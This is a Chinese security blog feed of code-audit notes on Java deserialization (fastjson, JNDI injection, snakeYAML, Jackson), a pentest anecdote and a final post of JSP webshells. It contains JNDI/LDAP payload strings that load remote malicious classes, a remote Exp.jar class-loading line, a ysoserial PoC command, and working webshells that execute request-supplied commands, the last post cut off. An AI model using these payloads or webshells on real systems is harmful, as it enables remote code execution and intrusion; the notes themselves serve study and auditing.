java">Java.lang.class#newInstance-&gt;<br>java.lang.reflect.Constructor#newInstance-&gt;<br>sun.reflect.DelegatingConstructorAccessorImpl#newInstance-&gt;<br>sun.reflect.NativeConstructorAccessorImpl#newInstance-&gt;<br>sun.reflect.NativeConstructorAccessorImpl#newInstance0<br></code></pre></div></td></tr></table></figure><p><img src="/images/57/45.png"></p><h2 id="总结流程为：-1"><a href="#总结流程为：-1" class="headerlink" title="总结流程为："></a>总结流程为：</h2><p>获取数据源-&gt;获取参数协议头，根据获取的协议进入对应的处理方法-&gt;加载factory对象-&gt;实例化获取的对象</p><h1 id="总结fastjson漏洞原理："><a href="#总结fastjson漏洞原理：" class="headerlink" title="总结fastjson漏洞原理："></a>总结fastjson漏洞原理：</h1><p>fastjson是根据json内容转为对应的javabean，即fastjson会取得json中的类及类的参数进行反序列化，由于json可控，攻击者可以自定义类及类的参数，所以fastjson在获取攻击者传入的对象的set、get方法时会根据攻击者传入的json来进行设定set方法的值，最后在反序列化时触发漏洞。拿jndi注入来说，攻击者传入json内容<code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.83.11:1389/o=tomcat&quot;,&quot;autoCommit&quot;:true&#125;</code>，fastjson首先会取得JdbcRowSetImpl类，在取JdbcRowSetImpl类的所有set、get方法时会将数据源ldap://192.168.83.11:1389/o=tomcat当作setDataSourceName的值来设定，最后在还原成JdbcRowSetImpl时就会去加载该数据源从而加载远程恶意类达到攻击目的。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用</a></li><li><a href="https://xz.aliyun.com/t/6633">JNDI注入原理及利用</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastjson反序列化</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于类加载的衍生学习</title>
    <link href="/2021/03/10/54/"/>
    <url>/2021/03/10/54/</url>
    
    <content type="html"><![CDATA[<p>newInstance: 弱类型。低效率。只能调用无参构造。</p><p>new: 强类型。相对高效。能调用任何public构造<br>new是关键字,用来生产对象,可以调用类的公开任何构造方法，而newInstance是反射时用的。<br>这两个都是实例化对象用的</p><h1 id="New的用法"><a href="#New的用法" class="headerlink" title="New的用法"></a>New的用法</h1><p><code>TestRun.java</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> controller;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2021/3/10</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 16:32</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;<br>        Test obj = <span class="hljs-keyword">new</span> Test();<span class="hljs-comment">//创建一个对象，有参写法是new Test(&quot;novy&quot;)</span><br>        String document1=obj.document;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在Test类里有一个无参方法和有参方法<br><code>Test.java</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> controller;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2021/3/10</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 16:18</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String document;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Test</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;无参方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Test</span><span class="hljs-params">(String ff)</span> </span>&#123; <br>        document = ff;<br>        System.out.println(<span class="hljs-string">&quot;有参方法&quot;</span>+ff);<br><span class="hljs-comment">//</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当TestRun里的是new Test(“a”)的时候就会运行Test类里有参的构造方法<br><img src="/images/54/2.png"><br>当new Test()时就是无参，会到Test类的运行无参构造方法，运行结果如下<br><img src="/images/54/1.png"></p><h1 id="newInstance的学习"><a href="#newInstance的学习" class="headerlink" title="newInstance的学习"></a>newInstance的学习</h1><p><code>TestRun.java</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> controller;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2021/3/10</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 16:32</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;<br><br>    Class test1 = Class.forName(<span class="hljs-string">&quot;controller.Test&quot;</span>);<br>                <span class="hljs-comment">//这个其实就相当于无参的new Test()</span><br>        Object test2 = test1.newInstance();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行结果<br><img src="/images/54/3.png"><br>关于对</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">new</span> java.net.URLClassLoader(<span class="hljs-keyword">new</span> java.net.URL[]&#123;<span class="hljs-keyword">new</span> java.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:8999/Exp.jar&quot;</span>)&#125;).loadClass(<span class="hljs-string">&quot;Exp&quot;</span>).getConstructors()[<span class="hljs-number">0</span>].newInstance(<span class="hljs-string">&quot;127.0.0.1:2333&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>的衍生学习<br><code>TestRun.java</code></p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> controller;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2021/3/10</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 16:32</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, InstantiationException, InvocationTargetException </span>&#123;<br>    Class test1 = Class.forName(<span class="hljs-string">&quot;controller.Test&quot;</span>);<br>        Object test2 = test1.newInstance(<span class="hljs-string">&quot;123&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>因为newInstance只能获取无参构造方法，所以直接写参数是不行的，<br><img src="/images/54/4.png"><br>所以这时候就要用到getConstructors方法，getConstructors()的作用是获取类中全部构造方法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class test1 = Class.forName(<span class="hljs-string">&quot;controller.Test&quot;</span>);<br>Object test2 = test1.getConstructors()[<span class="hljs-number">1</span>].newInstance(<span class="hljs-string">&quot;123&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>运行结果如下<br><img src="/images/54/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>snakeYAML反序列化笔记</title>
    <link href="/2021/03/05/53/"/>
    <url>/2021/03/05/53/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> vultest;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span>: novy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span>: 2021/3/5</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@time</span>: 16:06</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-keyword">import</span> org.yaml.snakeyaml.Yaml;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">YmlTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String normal =<span class="hljs-string">&quot;hello novy&quot;</span>;<br>        Yaml yaml =<span class="hljs-keyword">new</span> Yaml();<br>        Object obj = yaml.load(normal);<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">mYml</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String mevil = <span class="hljs-string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: &#x27;ldap://192.168.43.4:1389/o=reference&#x27;, autoCommit: true&#125;&quot;</span>;<br>        Yaml yaml = <span class="hljs-keyword">new</span> Yaml();<br>        Object obj = yaml.load(mevil);<br>        System.out.println(obj);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test1</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Yaml yaml = <span class="hljs-keyword">new</span> Yaml();<br>        TestImpl test = <span class="hljs-keyword">new</span> TestImpl();<br>        test.name=<span class="hljs-string">&quot;novy&quot;</span>;<br>        test.length=<span class="hljs-number">24</span>;<br>        String dump = yaml.dump(test);<br>        System.out.println(dump);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>参考：<br><a href="https://cloud.tencent.com/developer/article/1598048" title="IDEA动态调试(三)——反序列化漏洞(xml+Yaml)">IDEA动态调试(三)——反序列化漏洞(xml+Yaml)</a><br><a href="http://www.b1ue.cn/archives/239.html" title="Java 反序列化漏洞始末（5）— XML/YAML">Java 反序列化漏洞始末（5）— XML/YAML</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jndi注入笔记</title>
    <link href="/2021/03/01/51/"/>
    <url>/2021/03/01/51/</url>
    
    <content type="html"><![CDATA[<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><p>首先要理解jndi与rmi和ldap的关系，通俗的说，jndi相当于是一个接口，rmi和ldap是访问这个接口的协议。<br>RMI（远程方法调用）通俗的说就像将一个class放在A机器上，然后在B机器中调用这个class的方法<br>在审计jndi注入时重点关注.lookup,如</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">context.lookup(servername)<br></code></pre></div></td></tr></table></figure><p>如果<code>servername</code>可控则会存在jndi注入</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">如果通过env设置上下文的环境变量为rmi://127.0.0.1:1099/，后面lookup则不需要ULR定位，可以直接为已绑定的Name。<br><br>lookup支持动态协议转换，即便已经设置了上下文，也可以重新指定URL，比如使用ldap协议<br></code></pre></div></td></tr></table></figure><h1 id="项目实例"><a href="#项目实例" class="headerlink" title="项目实例"></a>项目实例</h1><p><img src="/images/51/1.png"><br>如笔记所说，context.lookup几个参数，我们查看这几个参数是否可控<br>在头部引用的MessageQueueDto类中<br><img src="/images/51/2.png"><br>做了实体定义<br><img src="/images/51/3.png"><br>从调用该实体的<code>WorkConfigQuery</code>类中的<code>queryMessageQueue</code>方法得知各参数对应的标签<br><img src="/images/51/4.png"><br>因为URL等标签值可控，导致漏洞产生，接下来就找到调用该方法的servlet就可以进行漏洞利用</p><p>参考：<br><a href="https://xz.aliyun.com/t/7900?spm=5176.12901015.0.i12901015.3a94525cuB6DSl#toc-12" title="Java反序列化-RMI&amp;JNDI初探">Java反序列化-RMI&amp;JNDI初探</a><br><a href="https://www.freebuf.com/vuls/115849.html" title="Jndi注入及Spring RCE漏洞分析">Jndi注入及Spring RCE漏洞分析</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE小记</title>
    <link href="/2021/02/26/52/"/>
    <url>/2021/02/26/52/</url>
    
    <content type="html"><![CDATA[<p>没啥好说的</p><p><img src="/images/52/1.png"><br><code>XMLDom4jUtils</code>类的<code>fromXML</code>方法为具体解析实现<br><img src="/images/52/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>readObject与readValue</title>
    <link href="/2021/02/10/50/"/>
    <url>/2021/02/10/50/</url>
    
    <content type="html"><![CDATA[<p>ObjectInputStream的readObject是将二进制数据还原成一个对象</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">this</span>.mClient.getInputStream())<br>Object o = ois.readObject();<br></code></pre></div></td></tr></table></figure><p>而objectMapper.readValue（jackson组件，可以实现json跟javabean之间的转换）是根据get/set方法来读写对象<br>比如这个待序列化的类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;  <br>    <span class="hljs-keyword">private</span> Integer age;<br>    <span class="hljs-keyword">private</span> String email;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName_1</span><span class="hljs-params">()</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> name;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName_1</span><span class="hljs-params">(String name)</span> </span>&#123;  <br>        <span class="hljs-keyword">this</span>.name = name;  <br>    &#125;  <br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;  <br>        <span class="hljs-keyword">return</span> age;  <br>    &#125;  <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>&#123;  <br>        <span class="hljs-keyword">this</span>.age = age;  <br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;name:&quot;</span> + name + <span class="hljs-string">&quot; age:&quot;</span> + age;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对他进行序列化</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoSerialize</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        Demo test = <span class="hljs-keyword">new</span> Demo();<br>        test.setName_1(<span class="hljs-string">&quot;novy&quot;</span>);<br>        test.setAge(<span class="hljs-number">18</span>);<br><br>        ObjectMapper mapper = <span class="hljs-keyword">new</span> ObjectMapper();<br>        String json = mapper.writeValueAsString(test);<br>        System.out.println(json);<br><br>        List&lt;Demo&gt; test2 = <span class="hljs-keyword">new</span> ArrayList&lt;Demo&gt;();  <br>        test2.add(test);  <br>        String jsonlist = mapper.writeValueAsString(test2);  <br>        System.out.println(jsonlist);  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果输出为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;age&quot;</span>:18,<span class="hljs-string">&quot;name_1&quot;</span>:<span class="hljs-string">&quot;novy&quot;</span>&#125;<br>[&#123;<span class="hljs-string">&quot;age&quot;</span>:18,<span class="hljs-string">&quot;name_1&quot;</span>:<span class="hljs-string">&quot;novy&quot;</span>&#125;]<br></code></pre></div></td></tr></table></figure><p>反序列化</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DemoDeserialize</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        String json = <span class="hljs-string">&quot;&#123;\&quot;name_1\&quot;:\&quot;novy\&quot;,\&quot;age\&quot;:18&#125;&quot;</span>; <br>        ObjectMapper mapper = <span class="hljs-keyword">new</span> ObjectMapper();  <br>        Demo user = mapper.readValue(json, Demo.class); <span class="hljs-comment">//根据Demo类中存在的set/get方法进行反序列化  </span><br>        System.out.println(user.toString());  <br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>结果输出为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">name:novy age:18<br></code></pre></div></td></tr></table></figure><p>不分析了，看参考链接</p><p><strong>参考链接</strong><br><a href="http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/">http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梭哈40分钟</title>
    <link href="/2021/01/20/48/"/>
    <url>/2021/01/20/48/</url>
    
    <content type="html"><![CDATA[<p><img src="/images/48/08.jpg"><br>在这里有两个项目，一个是代码审计一个是渗透测试，qax是代码审计，qm是渗透测试，按照客户要求晚上配合qm的做季度渗透，因为审计过的原因知道这个系统引用的组件版本存在漏洞，通过过滤器知道flex作用于messagebroker/*<br><img src="/images/48/010.png"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.8-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 <span class="hljs-string">&quot;sleep-check-20&quot;</span>  poc.amf<br></code></pre></div></td></tr></table></figure><p><img src="/images/48/04.png"><br>生成一个休眠20秒的poc直接打过去<br><img src="/images/48/05.png"></p><p>根据以往的审计报告<br>再顺手捡个任意文件上传<br><img src="/images/48/06.png"><br>任意文件下载<br><img src="/images/48/07.png"></p><p><img src="/images/48/09.png"><br>本来是要求渗透到第二天七点的，但是都这样了我怎么可能允许自己再通宵，下班，让qm的继续去透吧<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=382399289,3059525514&fm=26&gp=0.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>项目趣事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>amf反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录几个jsp马及免杀webshell项目推荐</title>
    <link href="/2021/01/20/49/"/>
    <url>/2021/01/20/49/</url>
    
    <content type="html"><![CDATA[<h1 id="正常命令执行"><a href="#正常命令执行" class="headerlink" title="正常命令执行"></a>正常命令执行</h1><p><code>1.jsp?cmd=whoami</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;%=Runtime.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>))%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%<br>    InputStream <span class="hljs-keyword">in</span> = Runtime.getRuntime().<span class="hljs-built_in">exec</span>(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).getInputStream();<br><br>    ByteArrayOutputStream baos = new ByteArrayOutputStream();<br>    byte[] b = new byte[1024];<br>    int a = -1;<br><br>    <span class="hljs-keyword">while</span> ((a = in.read(b)) != -1) &#123;<br>        baos.write(b, 0, a);<br>    &#125;<br><br>    out.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> + new String(baos.toByteArray()) + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>%&gt;<br></code></pre></div></td></tr></table></figure><h1 id="反射加载Runtime"><a href="#反射加载Runtime" class="headerlink" title="反射加载Runtime"></a>反射加载Runtime</h1><p><code>1.jsp?str=whoami</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page import=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page import=<span 